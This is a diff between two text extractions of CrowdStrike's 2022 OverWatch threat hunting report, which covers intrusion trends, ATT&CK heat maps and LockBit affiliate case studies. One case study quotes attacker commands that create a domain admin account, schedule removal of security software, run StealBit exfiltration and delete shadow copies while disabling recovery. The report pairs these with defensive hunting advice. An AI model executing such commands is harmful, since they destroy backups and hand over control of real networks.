@@ -22,36 +22,48 @@ Looking Back: Adversary Trends
 17 
 Looking Beyond the CVE
 18
-LockBit and Its Technicolor Affiliate Program:
+LockBit and Its Technicolor Affiliate Program: 
+ 
+
 How One RaaS Offering Has Spawned Diverse Tradecraft
 22
 Tooling Deep Dive: Emerging, Trending and Mainstay Tools
 29
-Better Together: OverWatch and Falcon Complete
+Better Together: OverWatch and Falcon Complete
+ 
+
 Team Up to Deliver Immediate Time\-to\-Value
 36
 Looking Deeper: Interesting Tradecraft
 38
 AQUATIC PANDA Demonstrates Deep Familiarity in Victim Network
 39
-Healthcare Sector Finds Itself in the Crosshairs
+Healthcare Sector Finds Itself in the Crosshairs
+ 
+
 of eCrime Ransomware Affiliates 
 
 46
-Out with the Old, In with the ISO: How Adversaries
+Out with the Old, In with the ISO: How Adversaries
+ 
+
 Have Adapted to the Retirement of the Macro
 54
-Better Together: Be an Active Partner to Get the Most from
+Better Together: Be an Active Partner to Get the Most from
+ 
+
 Your OverWatch and Falcon Subscription
 61
 Looking Ahead: OverWatch Showcases the Future of Threat Hunting
 62
 OverWatch Takes to the Sky: Hunting for Adversaries in the Cloud
 63
-OverWatchs Patented Technology Delivers
+OverWatch’s Patented Technology Delivers
+ 
+
 Inimitable Threat Hunting Capability
 69
-Better Together: Threes a CrowdStrike Powerhouse
+Better Together: Three’s a CrowdStrike Powerhouse
 72
 Conclusion
 73
@@ -83,67 +95,77 @@ derived from OverWatch
 50%
 Increase in interactive 
 intrusion campaigns
-The CrowdStrike Falcon OverWatch threat hunting team has been 
+The CrowdStrike Falcon OverWatch™ threat hunting team has been 
 uncovering record volumes of hands\-on intrusion attempts and tracking 
 some marked changes in adversary tradecraft. This report shares 
-insights from OverWatchs around\-the\-clock threat hunting from July 1, 
+insights from OverWatch’s around\-the\-clock threat hunting from July 1, 
 2021 through June 30, 2022\.
 1 The findings and data in this report reflect 
-observations derived from OverWatchs global hunting activities.
+observations derived from OverWatch’s global hunting activities.
 In this 12\-month period, OverWatch threat hunters directly identified 
 more than 77,000 potential intrusions, or approximately one potential 
 intrusion every seven minutes. This represents thousands of instances 
 where human\-driven hunting uncovered adversaries actively seeking to 
 evade autonomous detection methods.
 Crucially, OverWatch uses each of these potential intrusions as an 
-opportunity to hone the Falcon platforms ability to detect and prevent 
+opportunity to hone the Falcon platform’s ability to detect and prevent 
 similar intrusions more quickly and autonomously. During the reporting 
 period, threat hunters distilled their findings into the development of 
 hundreds of new behavioral\-based preventions, resulting in the Falcon 
-platforms direct prevention of over 1 million malicious events. These 
-behavioral\-based preventions enhance the Falcon platforms power to 
+platform’s direct prevention of over 1 million malicious events. These 
+behavioral\-based preventions enhance the Falcon platform’s power to 
 uncover novel adversary behavior with greater speed and scale.
-This years report starts with a close look at OverWatchs extensive 
+This year’s report starts with a close look at OverWatch’s extensive 
 dataset covering observed interactive threat actor behaviors, which we 
-will refer to in this report as intrusion activity. It uses this data to examine 
+will refer to in this report as “intrusion activity.” It uses this data to examine 
 how and where adversaries are operating to provide a comprehensive 
 overview of the threat landscape.
 1 
-Unless stated otherwise, the terms this year, last year or past year used through
+Unless stated otherwise, the terms “this year,” “last year” or “past year” used through­
 out the report refer to the period from July 1, 2021 to June 30, 2022\. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 4
 Key findings from this 
-data include:\+
+data include:
+ 
+\+
 OverWatch tracked a 50% increase in interactive intrusion 
-activity year\-over\-year.\+
+activity year\-over\-year.
+ 
+\+
 Breakout time for eCrime adversaries remained fast, averaging 
-1 hour and 24 minutes.\+
+1 hour and 24 minutes.
+ 
+\+
 Technology, telecommunications, healthcare, manufacturing 
 and academia were the top 5 industries most frequently 
-targeted by interactive intrusion activity.\+
+targeted by interactive intrusion activity.
+ 
+\+
 Malware\-free activity accounted for 71% of all detections 
-indexed by CrowdStrike Threat Graph.2Looking Back
+indexed by CrowdStrike Threat Graph®.2
+
+Looking Back
 A number of trends stood out to OverWatch as emblematic of the past 
 year, in which the importance of proactive threat hunting shone through 
 the proliferation of newly disclosed vulnerabilities and zero\-days. 
 In some instances, OverWatch detected zero\-day exploits and 
 notified customers of vulnerability\-related intrusion activity before 
-the vulnerability was disclosed; this was possible due to OverWatchs 
+the vulnerability was disclosed; this was possible due to OverWatch’s 
 relentless focus on hunting for post\-exploitation tradecraft.
-Avast array of affiliates are capitalizing on the availability of ransomware\-
+A vast array of affiliates are capitalizing on the availability of ransomware\-
 as\-a\-service (RaaS) offerings. This has contributed to wide variations 
 in eCrime affiliate tradecraft with threat hunters becoming skilled at 
 identifying diverse patterns of adversary tradecraft that preceded the 
-deployment of RaaS tooling.
-This reports retrospective concludes with a comprehensive look at 
+deployment of RaaS tooling. 
+This report’s retrospective concludes with a comprehensive look at 
 the tools adversaries are leveraging. This includes an examination 
 of emerging tools, trending tools and the tools that have remained 
 persistently popular in adversary arsenals.
 2 
 For information on the CrowdStrike Threat Graph, see:
-https:www.crowdstrike.comfalcon\-platformthreat\-graph
+https://www.crowdstrike.com/falcon\-platform/threat\-graph/
 eCrime 
 Breakout Time
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -152,7 +174,7 @@ CrowdStrike
 Looking Deeper
 As important as it is to look at trends, it is equally important to consider 
 outliers. The report looks at some of the most novel and sophisticated 
-tradecraft observed this year evidence of adversaries enduring 
+tradecraft observed this year — evidence of adversaries’ enduring 
 capacity for innovation.
 The technology sector remained a popular target for eCrime and 
 targeted intrusion adversaries alike. A featured case study examines the 
@@ -171,14 +193,14 @@ so too does adversary interest in cloud\-based resources. OverWatch
 is widening the aperture to capture this new direction in adversary 
 targeting. The report looks at cloud\-based intrusions that OverWatch 
 and the CrowdStrike Services team handled this year and provides 
-insights into how interactive threats are playing out in this arena.
+insights into how interactive threats are playing out in this arena. 
 In looking to the future, the report also details the patented technology 
-that underpins OverWatchs hunting capability and makes it possible to 
+that underpins OverWatch’s hunting capability and makes it possible to 
 effectively scale human\-driven insights.
 A Note 
 to the Reader 
-This reports findings 
-relate to interactive (i.e 
+This report’s findings 
+relate to interactive (i.e., 
 hands\-on) targeted3 and 
 eCrime intrusions that 
 OverWatch tracks and do not 
@@ -187,18 +209,18 @@ spectrum of attacks that are
 stopped by OverWatch or 
 the Falcon platform.
 Moreover, the term 
-intrusion is used to 
+“intrusion” is used to 
 describe any malicious 
 interactive activity that 
 OverWatch uncovers in 
 a victim environment. 
 Intrusion is not synonymous 
-with a breach and should 
+with a “breach” and should 
 not be understood to mean 
 that the threat actor was able 
 to achieve their objectives.
 3 
-The term targeted intrusion in this 
+The term “targeted intrusion” in this 
 report refers to state\-nexus or other 
 advanced persistent threat actors.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -254,13 +276,13 @@ CrowdStrike
 Intrusions 
 by Threat Type
 Of the intrusions where attribution was possible, financially motivated eCrime activity 
-was again the dominant threat type. As shown inFigure 1, eCrime accounted for 43% of 
+was again the dominant threat type. As shown in Figure 1, eCrime accounted for 43% of 
 the interactive intrusion activity, while targeted intrusions increased to 18% and hacktivist 
 activity made up 1%; the remaining 38% of intrusions were unattributed. It is important to 
 note that the figures shown in Figure 1 differ from past reporting due to the inclusion of the 
 unattributed intrusion data.
 Unattributed but Not Underestimated
-OverWatch decided to report publicly on unattributed intrusion activity in this years 
+OverWatch decided to report publicly on unattributed intrusion activity in this year’s 
 report because unattributable activity has been growing in prevalence year\-over\-year. 
 For organizations to make informed and proactive decisions about security, it is crucial 
 that defenders not only be aware of well\-defined threats but also remain alert to the risk of 
@@ -272,10 +294,10 @@ of tradecraft to investigate, which prevents high\-confidence attribution. This 
 compounded by the continued blurring of the lines between eCrime and targeted intrusion 
 tradecraft and tooling, which also curtails high\-confidence attribution. Moreover, the 
 motivations underlying intrusion activity are complex and diverse, and the paths that 
-adversaries take to advance their mission can be indirect and inventive one intrusion 
-attempt in isolation may not reveal the full extent of an adversarys motivations.
+adversaries take to advance their mission can be indirect and inventive — one intrusion 
+attempt in isolation may not reveal the full extent of an adversary’s motivations.
 Organizations would be mistaken to believe that the threats they face are predictable. 
-Considering the unknown is a cornerstone of OverWatchs proactive hunting strategy. 
+Considering the unknown is a cornerstone of OverWatch’s proactive hunting strategy. 
 Rather than making assumptions about adversary motivations, OverWatch hunts for any 
 and all evidence of post\-exploitation activity across its global customer data set to provide 
 proactive coverage against both known and unknown threats.
@@ -283,7 +305,7 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 8
 Intrusions by Industry Vertical
-Notably, in this past year OverWatch uncovered interactive intrusion activity spanning 37 distinct industries proof that no 
+Notably, in this past year OverWatch uncovered interactive intrusion activity spanning 37 distinct industries — proof that no 
 industry is immune, and evidence of the importance of remaining vigilant.
 Figure 2 shows the relative frequency of intrusions for the top 10 industry verticals in which OverWatch uncovered interactive 
 intrusion activity last year. This is compared with the relative frequency of intrusions in each industry vertical in the last 
@@ -322,7 +344,7 @@ technology companies and their vulnerability to disruption, they are also a soug
 eCrime adversaries. The telecommunications industry remained in second place, driven in large part by targeted intrusion 
 adversaries that conduct operations against telecommunications providers, likely to fulfill their surveillance, intelligence and 
 counterintelligence collection priorities.
-Notable changes in this years list include increased activity against the healthcare and academic industries. This year, intrusions 
+Notable changes in this year’s list include increased activity against the healthcare and academic industries. This year, intrusions 
 in the healthcare industry were predominantly carried out by eCrime adversaries (eCrime affiliate activity against the healthcare 
 industry is explored in detail later in this report). In contrast, last year, OverWatch reported a significant amount of targeted 
 intrusion activity against the healthcare industry, particularly related to involvement in COVID\-19 related research. Looking at the 
@@ -413,13 +435,13 @@ Of attributable intrusions, OverWatch tracked 12 named eCrime (aka
 SPIDER) threat actors; of these, PROPHET SPIDER was the most 
 prolific, responsible for more than twice as many attributed interactive 
 intrusions than the next most active eCrime actor, CARBON SPIDER. 
-PROPHET SPIDER is likely an access broker an actor that gains 
+PROPHET SPIDER is likely an access broker — an actor that gains 
 access with the intention to sell that access for profit rather than carrying 
 out actions on objectives directly. Were it not for OverWatch alerting 
 victim organizations to these PROPHET SPIDER intrusions, they likely 
 would have progressed to a ransomware incident or breach.
 ECrime adversaries remain highly capable, particularly if measured by 
-the speed at which they can move through a victims environment. An 
+the speed at which they can move through a victim’s environment. An 
 important OverWatch speed measurement is breakout time: the time 
 an adversary takes to move laterally, from an initially compromised host 
 to another host within the victim environment. Of the hands\-on eCrime 
@@ -454,7 +476,7 @@ Hacktivist actor group FRONTLINE JACKAL was highly active this
 past year, seen operating across 11 industry verticals; by comparison, 
 this threat actor was only found in four industry verticals in the 
 previous reporting period. This increase in activity is linked to the 
-adversarys adoption of opportunistic initial access tactics.
+adversary’s adoption of opportunistic initial access tactics.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 12
@@ -509,12 +531,20 @@ Technology
 Telecommunications
 Transportation \& Logistics
 Figure 4\. Heat map of intrusion campaigns by adversary group and industry vertical, July 2021 to June 2022
-A few things to note about the data presented in Figure 4:\+
-The heat mapping represents the number of distinct actors active within a particular vertical.\+
+A few things to note about the data presented in Figure 4:
+ 
+\+
+The heat mapping represents the number of distinct actors active within a particular vertical.
+ 
+\+
 The heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple 
-intrusions by the same adversary group are only represented once.\+
+intrusions by the same adversary group are only represented once.
+ 
+\+
 Attribution to a high degree of confidence is not always possible. This table does not reflect any unattributed 
-activity that occurred in any of the industry verticals.\+
+activity that occurred in any of the industry verticals.
+ 
+\+
 Verticals not listed indicate that OverWatch recorded no intrusions attributable to a specific actor group during 
 this period.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -524,13 +554,13 @@ Adversary
 Technique Insights
 OverWatch carefully documents the details of each intrusion it uncovers, building a rich data 
 set of adversary activity. With each new intrusion, threat hunters create a sharper picture of 
-the threat landscape and tradecraft of adversaries that inhabit it better equipping defenders 
+the threat landscape and tradecraft of adversaries that inhabit it — better equipping defenders 
 to take a proactive and evidence\-informed approach to protecting their environment. The 
-following analysis draws on OverWatchs rich repository of intrusion data collected over the 
+following analysis draws on OverWatch’s rich repository of intrusion data collected over the 
 past year.
 MITRE ATT\&CK Heat Map
-OverWatch tracks interactive intrusion activity against the MITRE ATT\&CK Enterprise 
-Matrix a framework to categorize and track adversary behavior.5
+OverWatch tracks interactive intrusion activity against the MITRE ATT\&CK® Enterprise 
+Matrix — a framework to categorize and track adversary behavior.5
 The following heat map illustrates the prevalence of adversary tactics, techniques, 
 sub\-techniques and tools observed last year by OverWatch threat hunters. The heat 
 map reflects the most current MITRE naming conventions for techniques and sub\-
@@ -540,14 +570,14 @@ and does not reflect the breadth of activity seen and stopped by the Falcon plat
 This table excludes any techniques or sub\-techniques not observed by OverWatch in 
 this reporting period.
 Notably, this year saw a shift in the persistence techniques favored by adversaries 
-compared to the previous year, with increases seen in adversaries use of both server 
-software components particularly web shells and IIS components.
-Other than these slight shifts in persistence techniques, much of this years heat 
-map reflects the previous years. Exploiting public facing infrastructure, abusing 
+compared to the previous year, with increases seen in adversaries’ use of both server 
+software components — particularly web shells — and IIS components. 
+Other than these slight shifts in persistence techniques, much of this year’s heat 
+map reflects the previous year’s. Exploiting public facing infrastructure, abusing 
 remote services (particularly RDP), dumping OS credentials and accessing unsecure 
-credentials all remain popular and heavily represented in this years heat map.
+credentials all remain popular and heavily represented in this year’s heat map.
 5 
-To learn more about MITRE ATT\&CK, visithttps:attack.mitre.orgmatricesenterprise.
+To learn more about MITRE ATT\&CK, visit https://attack.mitre.org/matrices/enterprise/.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 14
@@ -597,7 +627,7 @@ Spearphishing Attachment
 JavaScript
 Create Account
 Local Account
-Scheduled TaskJob
+Scheduled Task/Job
 Scheduled Task
 Spearphishing Link
 Windows Management 
@@ -612,12 +642,12 @@ Additional Email Delegate
 Permissions
 Create or Modify System Process
 Windows Service
-Scheduled TaskJob
+Scheduled Task/Job
 Scheduled Task
 SSH Authorized Keys
 Systemd Service
 Cron
-Scheduled TaskJob
+Scheduled Task/Job
 Scheduled Task
 Exploitation for Privilege 
 Escalation
@@ -638,9 +668,9 @@ Software Deployment Tools
 External Remote Services
 Elevated Execution with Prompt
 Boot or Logon Autostart Execution
-Registry Run Keys Startup Folder
+Registry Run Keys / Startup Folder
 Boot or Logon Autostart Execution
-Registry Run Keys Startup Folder
+Registry Run Keys / Startup Folder
 Kernel Modules and Extensions
 Kernel Modules and Extensions
 Hijack Execution Flow
@@ -674,13 +704,13 @@ Access Token Manipulation
 Create Process with Token
 Boot or Logon Initialization Scripts
 Logon Script (Windows)
-Token ImpersonationTheft
+Token Impersonation/Theft
 Startup Items
 Boot or Logon Initialization Scripts
 Logon Script (Windows)
 Startup Items
-Domain Policy Modication
-Group Policy Modication
+Domain Policy Modiﬁcation
+Group Policy Modiﬁcation
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 15
@@ -700,17 +730,17 @@ Valid Accounts
 Domain Accounts
 OS Credential Dumping
 LSASS Memory
-System OwnerUser Discovery
+System Owner/User Discovery
 Remote Services
 Remote Desktop Protocol
 Local Accounts
 Security Account Manager
-System Network Conguration 
+System Network Conﬁguration 
 Discovery
 Internet Connection Discovery
-SMBWindows Admin Shares
+SMB/Windows Admin Shares
 Default Accounts
-etcpasswd and etcshadow
+/etc/passwd and /etc/shadow
 Process Discovery
 SSH
 Indicator Removal on Host
@@ -807,15 +837,15 @@ ARP Cache Poisoning
 Hidden Users
 NTFS File Attributes
 File and Directory Permissions 
-Modication
+Modiﬁcation
 Linux and Mac File and Directory 
-Permissions Modication
+Permissions Modiﬁcation
 Windows File and Directory 
-Permissions Modication
+Permissions Modiﬁcation
 Process Injection
 Process Hollowing
 Dynamic\-link Library Injection
-DeobfuscateDecode Files or 
+Deobfuscate/Decode Files or 
 Information
 Abuse Elevation Control 
 Mechanism
@@ -838,19 +868,19 @@ InstallUtil
 BITS Jobs
 Access Token Manipulation
 Create Process with Token
-Token ImpersonationTheft
+Token Impersonation/Theft
 Trusted Developer Utilities Proxy 
 Execution
 MSBuild
-Reective Code Loading
+Reﬂective Code Loading
 Indirect Command Execution
 Use Alternate Authentication 
 Material
 Pass the Hash
 Pass the Ticket
 Rootkit
-Domain Policy Modication
-Group Policy Modication
+Domain Policy Modiﬁcation
+Group Policy Modiﬁcation
 MITRE ATT\&CK
 Heat Map (2 of 3\)
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -858,7 +888,7 @@ CrowdStrike
 16
 Collection
 Command and Control
-Exltration
+Exﬁltration
 Impact
 Technique
 Sub\-technique
@@ -871,32 +901,32 @@ Sub\-technique
 Archive Collected Data
 Archive via Utility
 Ingress Tool Transfer
-Exltration Over C2 Channel
+Exﬁltration Over C2 Channel
 Data Encrypted for Impact
 Archive via Library
 Application Layer Protocol
 Web Protocols
-Exltration Over Alternative 
+Exﬁltration Over Alternative 
 Protocol
-Exltration Over Unencrypted 
+Exﬁltration Over Unencrypted 
 Non\-C2 Protocol
 Inhibit System Recovery
 Data from Local System
 File Transfer Protocols
-Exltration Over Asymmetric 
+Exﬁltration Over Asymmetric 
 Encrypted Non\-C2 Protocol
 Resource Hijacking
 Data Staged
 Local Data Staging
 DNS
-Exltration Over Symmetric 
+Exﬁltration Over Symmetric 
 Encrypted Non\-C2 Protocol
 Service Stop
 Remote Data Staging
 Remote Access Software
-Exltration Over Web Service
-Exltration to Cloud Storage
-System ShutdownReboot
+Exﬁltration Over Web Service
+Exﬁltration to Cloud Storage
+System Shutdown/Reboot
 Data from Information 
 Repositories
 Non\-Standard Port
@@ -904,7 +934,7 @@ Data Transfer Size Limits
 Data Destruction
 Data from Network Shared Drive
 Protocol Tunneling
-Exltration Over Other Network 
+Exﬁltration Over Other Network 
 Medium
 Data Manipulation
 Stored Data Manipulation
@@ -942,19 +972,19 @@ an effective and proactive defense into the future. Looking back over the
 past year, several trends stand out to OverWatch threat hunters.
 There was a continued shift from malware use, with malware\-free 
 activity accounting for 71% of all detections indexed by CrowdStrike 
-Threat Graph. This is related, in part, to adversaries prolific abuse 
+Threat Graph®. This is related, in part, to adversaries’ prolific abuse 
 of valid credentials to facilitate access and persistence in victim 
 environments. Another contributing factor is the rate at which new 
 vulnerabilities are being disclosed and the speed with which adversaries 
 are able to operationalize exploits. Many organizations are finding 
 themselves behind the 8\-ball, unable to keep up with the pace at which 
 these new threats are emerging. Rather than looking for fires, defenders 
-need to learn to smell the smoke to search for patterns of post\-
+need to learn to smell the smoke — to search for patterns of post\-
 exploitation activity, which is proven effective in detecting early evidence 
 of threats stemming from both known and unknown vulnerabilities.
 As part of the ongoing effort to understand the behaviors of adversaries, 
 OverWatch has been closely tracking the diversification of ransomware 
-affiliates tradecraft. In particular, the LockBit RaaS program has attracted 
+affiliates’ tradecraft. In particular, the LockBit RaaS program has attracted 
 a vast array of affiliates. This report shares the details of four distinct 
 LockBit intrusions uncovered last year by OverWatch, providing insights 
 into the commonalities and differences in adversary tradecraft that can 
@@ -964,7 +994,7 @@ encountered over the past year. This starts with a look at emerging
 tools that, though not highly prevalent across our data set, offer clues 
 into where adversaries are turning their attention. Next is an exploration 
 of trending tools that defenders should watch for as they have been 
-commonly observed in OverWatchs data set. Finally, the report looks at 
+commonly observed in OverWatch’s data set. Finally, the report looks at 
 the tools that have become mainstays of the adversary toolkit.
 Looking Back
 Adversary 
@@ -973,7 +1003,7 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 18
 Looking Beyond 
-the CVE
+the CVE 
 The number of zero\-days and newly disclosed CVEs continued to 
 rise year\-over\-year; concurrently, the time narrowed between the 
 disclosure of these vulnerabilities and active exploitation attempts 
@@ -996,10 +1026,10 @@ from focusing on assessing and improving detection and mitigation
 capabilities to seeking proactive hunting solutions capable of 
 addressing threats at scale.
 6 
-The CrowdStrike 2022 Global Threat Report detailed Chinese actors 
-exploit\-acquisition capabilities, particularly against Microsoft Exchange vulner
+The CrowdStrike 2022 Global Threat Report detailed Chinese actors’ 
+exploit\-acquisition capabilities, particularly against Microsoft Exchange vulner­
 abilities and other enterprise software hosted on internet\-facing servers. For 
-more information about the China\-nexus vulnerability exploitation view,see the 
+more information about the China\-nexus vulnerability exploitation view, see the 
 CrowdStrike 2022 Global Threat Report.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -1008,14 +1038,14 @@ New CVEs, Same Old Tricks
 The number of new vulnerabilities reported in 2021 exceeded 20,000, 
 surpassing any previous year.7 There is no sign of this abating in 2022, 
 with over 10,000 new vulnerabilities reported as of the start of June 
-1\. While the specific vulnerability exploited varies, the post\-
+2022\. While the specific vulnerability exploited varies, the post\-
 exploitation tradecraft and behaviors observed by OverWatch often 
-remain similar.
+remain similar. 
 Examining the tactics, techniques and procedures (TTPs) deployed 
 during hands\-on intrusions reveals common patterns of activity. 
 Successful exploitation is routinely followed by the deployment of web 
 shells, which are subsequently used to conduct discovery operations, 
-harvest credentials, and retrieve and execute remotely hosted tooling.
+harvest credentials, and retrieve and execute remotely hosted tooling. 
 Timely and comprehensive patching continues to play a crucial role 
 in preventing successful exploitations. However, this solution is not 
 always immediately available to defenders, particularly in the case 
@@ -1036,9 +1066,9 @@ exploitation attempts from both criminally motivated and targeted
 intrusion actors. 
 7 
 For data on the distribution of vulnerabilities over time, see the National 
-
-Vulnerability Database:https:nvd.nist.govgeneralvisualizationsvulnerability\-
-visualizationscvss\-severity\-distribution\-over\-time
+­
+Vulnerability Database: https://nvd.nist.gov/general/visualizations/vulnerability\-
+visualizations/cvss\-severity\-distribution\-over\-time
 20,000\+
 new vulnerabilities reported 
 in 2021
@@ -1058,7 +1088,7 @@ OverWatch began observing hands\-on malicious activity on Linux hosts
 at entities spanning numerous industry sectors including technology 
 and academia. This activity included web shell deployment, interactive 
 reconnaissance, attempted credential harvesting and the retrieval of 
-remotely hosted tooling. By virtue of OverWatchs focus on hands\-on, 
+remotely hosted tooling. By virtue of OverWatch’s focus on hands\-on, 
 post\-exploitation behaviors rather than hunting specific CVEs, impacted 
 organizations were provided with actionable and timely context that 
 allowed for early disruption of the adversary activity. This is a clear 
@@ -1082,13 +1112,13 @@ curtail a determined adversary that will simply pivot if one exploit attempt
 proves unsuccessful.
 8 
 For more information on this vulnerability, see:
-https:msrc.microsoft.comupdate\-guidevulnerabilityCVE\-2021\-34473\.
+https://msrc.microsoft.com/update\-guide/vulnerability/CVE\-2021\-34473\.
 9 
 For more information on this vulnerability, see:
-https:msrc.microsoft.comupdate\-guidevulnerabilityCVE\-2021\-34523\.
+https://msrc.microsoft.com/update\-guide/vulnerability/CVE\-2021\-34523\.
 10 
 For more information on this vulnerability, see:
-https:msrc.microsoft.comupdate\-guidevulnerabilityCVE\-2021\-31207\.
+https://msrc.microsoft.com/update\-guide/vulnerability/CVE\-2021\-31207\.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 21
@@ -1121,7 +1151,7 @@ and Windows
 hosts
 Numerous credential dumping 
 and harvesting techniques 
-employed, inducing sensitive le 
+employed, inducing sensitive ﬁle 
 enumeration, use of disguised 
 keyloggers and a distinctive 
 screen capture tool
@@ -1163,7 +1193,7 @@ and hunting for
 documents containing 
 sensitive information
 Afliate attempts to 
-exltrate data using 
+exﬁltrate data using 
 custom StealBit 
 malware, WinSCP and 
 PuTTY
@@ -1185,7 +1215,7 @@ Defender and
 masquerading 
 malicious binaries
 DEFENSE EVASION
-Afliate modies 
+Afliate modiﬁes 
 the registry to 
 enable inbound 
 RDP sessions from 
@@ -1214,8 +1244,8 @@ Affiliate Program: How One
 RaaS Offering Has Spawned
 Diverse Tradecraft
 Verticals Impacted by 
-LockBit from July1, 2021, 
-to June30, 2022:
+LockBit from July 1, 2021, 
+to June 30, 2022:
 Retail
 Healthcare
 Transportation 
@@ -1235,7 +1265,7 @@ Ransomware as a service (RaaS) affiliate models have exacerbated
 this situation. There is a common misconception that ransomware 
 events follow a single pattern. In reality, different affiliate groups often 
 use distinct tradecraft to deploy the same tooling. This makes threat 
-hunters job of identifying early stages of ransomware preparation more 
+hunters’ job of identifying early stages of ransomware preparation more 
 complex, requiring awareness of a vast array of intrusion tactics and 
 methodologies leveraged by affiliates. 
 To demonstrate exactly how the strategy of different affiliates can vary, 
@@ -1243,7 +1273,7 @@ the following analysis examines four distinct LockBit intrusions from last
 year. Because of its popularity and reputation, LockBit has an extensive 
 affiliate program. Each case study details the notable TTPs used by affiliates 
 and highlights key similarities and differences, providing security teams 
-with insight into the operational effort of tracking todays diverse eCrime 
+with insight into the operational effort of tracking today’s diverse eCrime 
 adversaries and the additional controls that should be applied to mitigate 
 against observed tradecraft. While not explicitly called out in each intrusion 
 case study, readers should note that, when correctly configured, the Falcon 
@@ -1270,30 +1300,30 @@ again in the intrusion described in Scenario 3\. The affiliate leveraged the
 new account to move rapidly to other hosts in the environment including 
 backup servers. 
 Newly created account:
-net user admina \[REDACTED] domain add
-net group domain admins admina add domain
+net user admina \[REDACTED] /domain /add
+net group “domain admins” admina /add /domain
 The affiliate downloaded tooling associated with rootkit removal that 
 is frequently abused by eCrime operatives in attempts to modify and 
 disable security tooling. They used a variety of locations, listed below, to 
 stage and execute their malicious tooling.
 List of tools and staging locations used by the affiliate: 
-Users\[REDACTED]DesktopPCHunter64\.exe
-Users\[REDACTED]DownloadsYDArk\-master.zip
-Users\[REDACTED]DownloadsCleanWipe.exe
-Users\[REDACTED]AppDataLocalTemp3
-Rar$EXa1280\.111814xnkw4ie.exe (renamed GMER TOOL)
+\\Users\\\[REDACTED]\\Desktop\\PCHunter64\.exe
+\\Users\\\[REDACTED]\\Downloads\\YDArk\-master.zip
+\\Users\\\[REDACTED]\\Downloads\\CleanWipe.exe
+\\Users\\\[REDACTED]\\AppData\\Local\\Temp\\3\\
+Rar$EXa1280\.11181\\4xnkw4ie.exe (renamed GMER TOOL)
 At one point, the affiliate tried to use scheduled tasks to execute the 
 CleanWipe tool, which is designed to remove a third\-party security tool:
-C:Windowssystem32schtasks.exe create tn \[REDACTED] 
-CleanWipe tr C:Users\[REDACTED]Downloads
-CleanWipe.exe scheduler sc ONSTART ru System
+C:\\Windows\\system32\\schtasks.exe /create /tn “\[REDACTED] 
+CleanWipe” /tr “\\”C:\\Users\\\[REDACTED]\\Downloads\\
+CleanWipe.exe\\” \-\-scheduler” /sc ONSTART /ru System
 The affiliate proceeded to deploy and execute a StealBit binary, using 
 it to target a design software database. This was followed by a LockBit 
 binary being written to disk:
-C:UsersadminaDesktopStealBit.exe 
-Z:sqlbkup\[REDACTED]\[REDACTED]test\_backup\_
+“C:\\Users\\admina\\Desktop\\StealBit.exe” 
+Z:\\sqlbkup\\\[REDACTED]\\\[REDACTED]test\_backup\_­
 \[REDACTED]\_210835\_3821288\.bak
-C:Users\[REDACTED]DownloadsLockBit\_8AA908FB9377176A.
+C:\\Users\\\[REDACTED]\\Downloads\\LockBit\_8AA908FB9377176A.
 exe
 INITIAL ACCESS
 Afliate gains 
@@ -1334,7 +1364,7 @@ Afliate gains
  with valid
  accounts
 DEFENSE EVASION
-Afliate modies 
+Afliate modiﬁes 
 the registry to 
 enable inbound 
 RDP sessions 
@@ -1353,7 +1383,7 @@ command
 execution
 Afliate 
 attempts to 
-exltrate data 
+exﬁltrate data 
 using custom 
 StealBit 
 malware, 
@@ -1365,22 +1395,29 @@ CrowdStrike
 24
 Finally, the affiliate attempted to remove volume shadow copies and 
 disable system recovery:
-C:WindowsSystem32cmd.exe c vssadmin delete 
-shadows all quiet \& wmic shadowcopy delete \& bcdedit 
-set {default} bootstatuspolicy ignoreallfailures \& 
-bcdedit set {default} recoveryenabled no
+“C:\\Windows\\System32\\cmd.exe” /c vssadmin delete 
+shadows /all /quiet \& wmic shadowcopy delete \& bcdedit 
+/set {default} bootstatuspolicy ignoreallfailures \& 
+bcdedit /set {default} recoveryenabled no
 To proactively hunt for this type of intrusion, defenders should watch for:
-New generic accounts being created and addedto privileged groups
-Creation of scheduled tasks that are unique to the organization 
-RDP sessions between critical hosts (domain controllers,backup servers)
-Unexpected execution of vssadmin and shadowcopycommands
+ New generic accounts being created and added 
+ 
+to privileged groups
+ Creation of scheduled tasks that are unique to the organization 
+ RDP sessions between critical hosts (domain controllers, 
+ 
+backup servers)
+ Unexpected execution of vssadmin and shadowcopy 
+ 
+ 
+commands
 A Bit About
 StealBit 
 BITWISE SPIDER, the 
 actor behind LockBit 
 development, also created a 
 custom information stealing 
-tool StealBit to facilitate 
+tool “StealBit” to facilitate 
 exfiltration activities. While 
 LockBit ransomware is 
 available to all, StealBit 
@@ -1397,33 +1434,37 @@ out the early stages of a ransomware attack. Unusually, the activity was
 limited to a single Windows 10 workstation. The affiliate gained access to 
 the host following a suspected brute\-forcing of credentials for a publicly 
 exposed RDP session. Once on the workstation, they quickly shifted to 
-action\-on\-objectives only light reconnaissance was observed and the 
+action\-on\-objectives — only light reconnaissance was observed and the 
 affiliate made no effort to move laterally. Notable tradecraft in this intrusion 
 included the use of a low\-prevalence intermediate binary to deliver and 
 attempt execution of both a LockBit binary and a separate screenlocker 
 tool. The affiliate then leveraged the RDP session to transfer the low\-
-prevalence binary to the %Users%Desktop directory; when executed, it 
+prevalence binary to the \\%Users%\\Desktop directory; when executed, it 
 fetched and executed the additional tooling. The intermediate ransomware 
 runner binary also contained capabilities to remove itself from the system 
 after executing. This was achieved by leveraging the Windows choice11 
 command to execute a hard\-coded internal batch script that deletes the 
-runner binary from the system. This is likely part of the affiliates defense 
+runner binary from the system. This is likely part of the affiliate’s defense 
